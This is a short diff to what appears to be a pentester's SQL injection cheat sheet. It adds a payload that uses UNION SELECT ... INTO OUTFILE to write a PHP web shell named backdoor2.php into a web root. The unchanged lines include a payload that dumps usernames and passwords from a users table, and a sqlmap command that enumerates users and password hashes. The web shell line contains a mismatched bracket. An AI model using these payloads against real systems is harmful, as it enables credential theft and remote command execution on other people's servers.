@@ -16,6 +16,10 @@
 
 1' UNION ALL SELECT concat(user,char(58),password),2 from users#
 
+```sh
+q=test&lang=en' UNION SELECT version(),2,3,4,"<?php echo shell_exec($_GET['cmd'});?>",6 INTO OUTFILE "c:/xampp/htdocs/backdoor2.php"#
+```
+
 
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 
